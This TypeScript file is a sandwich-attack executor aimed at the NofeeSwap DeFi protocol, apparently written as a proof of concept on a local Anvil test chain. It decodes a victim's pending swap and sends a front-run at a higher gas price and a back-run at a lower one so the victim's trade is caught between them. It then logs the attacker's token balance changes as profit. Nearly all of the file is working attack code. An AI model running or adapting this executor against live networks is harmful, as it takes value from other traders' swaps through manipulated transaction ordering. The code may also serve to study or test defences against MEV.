/**
 * Sandwich executor — constructs and broadcasts front-run + back-run transactions
 * around a victim's swap, using gas price ordering to guarantee execution order.
 */

import {
  createPublicClient,
  createWalletClient,
  http,
  type Hex,
  type Address,
  encodeFunctionData,
  formatEther,
  maxUint256,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { localhost as viemLocalhost } from "viem/chains";
import {
  ATTACKER_PRIVATE_KEY,
  MIN_PROFIT_WEI,
  NOFEESWAP,
  OPERATOR,
  RPC_URL,
  TOKEN0,
  TOKEN1,
} from "./config.js";
import { erc20Abi, nofeeswapAbi } from "./abis.js";
import { buildSwapSequence, attackerLimit } from "./sequences.js";
import type { PendingSwap } from "./monitor.js";

const chain = {
  ...viemLocalhost,
  id: 31337,
};

const account = privateKeyToAccount(ATTACKER_PRIVATE_KEY);

const publicClient = createPublicClient({
  chain,
  transport: http(RPC_URL),
});

const walletClient = createWalletClient({
  account,
  chain,
  transport: http(RPC_URL),
});

let approved = false;

async function ensureApprovals() {
  if (approved) return;

  console.log("[sandwich] Checking token approvals for attacker…");

  const a0 = (await publicClient.readContract({
    address: TOKEN0,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;

  const a1 = (await publicClient.readContract({
    address: TOKEN1,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;

  console.log(`[sandwich] Attacker balances: token0=${a0}  token1=${a1}`);

  // Approve operator to spend our tokens
  const allowance0 = (await publicClient.readContract({
    address: TOKEN0,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;

  // Always approve max for both tokens
  const hash0 = await walletClient.writeContract({
    address: TOKEN0,
    abi: erc20Abi,
    functionName: "approve",
    args: [OPERATOR, maxUint256],
  });
  console.log(`[sandwich] Approve token0 → operator: ${hash0}`);

  const hash1 = await walletClient.writeContract({
    address: TOKEN1,
    abi: erc20Abi,
    functionName: "approve",
    args: [OPERATOR, maxUint256],
  });
  console.log(`[sandwich] Approve token1 → operator: ${hash1}`);

  approved = true;
  console.log("[sandwich] Approvals done.\n");
}

/**
 * Execute a full sandwich around the victim's pending swap.
 *
 * Returns { profit, frontRunHash, backRunHash } or null if skipped.
 */
export async function executeSandwich(victim: PendingSwap): Promise<{
  profit: bigint;
  frontRunHash: Hex;
  backRunHash: Hex;
} | null> {
  await ensureApprovals();

  const { decoded } = victim;
  const {
    poolId,
    amountSpecified,
    limitOffsetted,
    zeroForOne,
    logOffset,
    impliedSlippageBps,
  } = decoded;

  console.log("┌─────────────────────────────────────────────────────");
  console.log("│ SANDWICH OPPORTUNITY DETECTED");
  console.log("├─────────────────────────────────────────────────────");
  console.log(`│ Victim tx:        ${victim.txHash}`);
  console.log(`│ Victim address:   ${victim.victimAddress}`);
  console.log(`│ Pool ID:          ${poolId}`);
  console.log(`│ Amount specified: ${amountSpecified}`);
  console.log(`│ zeroForOne:       ${zeroForOne}`);
  console.log(`│ Limit (offsetted):${limitOffsetted}`);
  console.log(`│ Slippage (est):   ~${impliedSlippageBps} bps`);
  console.log("└─────────────────────────────────────────────────────\n");

  // Snapshot balances before
  const bal0Before = (await publicClient.readContract({
    address: TOKEN0,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;
  const bal1Before = (await publicClient.readContract({
    address: TOKEN1,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;

  // Determine attacker trade sizes.
  // The attacker's front-run amount: scale with victim amount, capped to not exceed
  // their own balance. We use the absolute victim amount as our front-run size.
  const absAmount =
    amountSpecified < 0n ? -amountSpecified : amountSpecified;

  // Front-run: same direction as victim
  const frontRunAmount = -absAmount; // negative = exact-input style
  const frontRunLimit = attackerLimit(poolId, true, zeroForOne);

  // Back-run: opposite direction
  const backRunZeroForOne = zeroForOne === 2 ? 1 : 2;
  const backRunLimit = attackerLimit(poolId, false, zeroForOne);

  const deadline = Math.floor(Date.now() / 1000) + 600;
  const hookData = "0x" as Hex;

  // Build front-run calldata
  const frontRunData = buildSwapSequence(
    NOFEESWAP,
    TOKEN0,
    TOKEN1,
    account.address,
    poolId,
    frontRunAmount,
    frontRunLimit,
    zeroForOne,
    hookData,
    deadline,
  );

  const frontRunCalldata = encodeFunctionData({
    abi: nofeeswapAbi,
    functionName: "unlock",
    args: [OPERATOR, frontRunData],
  });

  // Build back-run calldata (same magnitude, opposite direction)
  const backRunData = buildSwapSequence(
    NOFEESWAP,
    TOKEN0,
    TOKEN1,
    account.address,
    poolId,
    frontRunAmount, // same magnitude — sell what we bought
    backRunLimit,
    backRunZeroForOne,
    hookData,
    deadline,
  );

  const backRunCalldata = encodeFunctionData({
    abi: nofeeswapAbi,
    functionName: "unlock",
    args: [OPERATOR, backRunData],
  });

  // Get the victim's gas price so we can bid above/below
  const victimGasPrice = victim.gasPrice || 1000000000n; // 1 gwei default

  // Get the attacker's nonce
  const nonce = await publicClient.getTransactionCount({
    address: account.address,
    blockTag: "pending",
  });

  console.log("[sandwich] Broadcasting front-run (higher gas) …");

  let frontRunHash: Hex;
  try {
    frontRunHash = await walletClient.sendTransaction({
      to: NOFEESWAP,
      data: frontRunCalldata,
      gas: 500_000n,
      gasPrice: victimGasPrice + 2000000000n, // +2 gwei above victim
      nonce,
    });
    console.log(`[sandwich]   front-run tx: ${frontRunHash}`);
  } catch (err) {
    console.error(
      "[sandwich]   front-run FAILED:",
      (err as Error).message.slice(0, 200),
    );
    return null;
  }

  console.log("[sandwich] Broadcasting back-run (lower gas) …");

  let backRunHash: Hex;
  try {
    backRunHash = await walletClient.sendTransaction({
      to: NOFEESWAP,
      data: backRunCalldata,
      gas: 500_000n,
      gasPrice: victimGasPrice > 1000000000n ? victimGasPrice - 1n : victimGasPrice,
      nonce: nonce + 1,
    });
    console.log(`[sandwich]   back-run tx:  ${backRunHash}\n`);
  } catch (err) {
    console.error(
      "[sandwich]   back-run FAILED:",
      (err as Error).message.slice(0, 200),
    );
    return null;
  }

  // Now mine all three transactions (Anvil manual mining)
  console.log("[sandwich] Mining block with all 3 transactions …");
  try {
    await fetch(RPC_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "evm_mine",
        params: [],
      }),
    });
  } catch (err) {
    console.error("[sandwich]   mining error:", (err as Error).message);
  }

  // Wait a moment for state to settle
  await new Promise((r) => setTimeout(r, 500));

  // Snapshot balances after
  const bal0After = (await publicClient.readContract({
    address: TOKEN0,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;
  const bal1After = (await publicClient.readContract({
    address: TOKEN1,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [account.address],
  })) as bigint;

  const delta0 = bal0After - bal0Before;
  const delta1 = bal1After - bal1Before;

  console.log("┌─────────────────────────────────────────────────────");
  console.log("│ SANDWICH RESULT");
  console.log("├─────────────────────────────────────────────────────");
  console.log(`│ Front-run tx:  ${frontRunHash}`);
  console.log(`│ Victim tx:     ${victim.txHash}`);
  console.log(`│ Back-run tx:   ${backRunHash}`);
  console.log("│");
  console.log(`│ Token0 before: ${bal0Before}`);
  console.log(`│ Token0 after:  ${bal0After}`);
  console.log(`│ Token0 Δ:      ${delta0 >= 0n ? "+" : ""}${delta0}`);
  console.log("│");
  console.log(`│ Token1 before: ${bal1Before}`);
  console.log(`│ Token1 after:  ${bal1After}`);
  console.log(`│ Token1 Δ:      ${delta1 >= 0n ? "+" : ""}${delta1}`);
  console.log("│");

  const profit = delta0 + delta1; // simplified — real bots use oracle pricing
  if (profit > 0n) {
    console.log(`│ NET PROFIT:    +${profit} (raw wei sum)`);
  } else {
    console.log(`│ NET RESULT:    ${profit} (raw wei sum — may be negative due to AMM fees/rounding)`);
  }
  console.log("└─────────────────────────────────────────────────────\n");

  return { profit, frontRunHash, backRunHash };
}
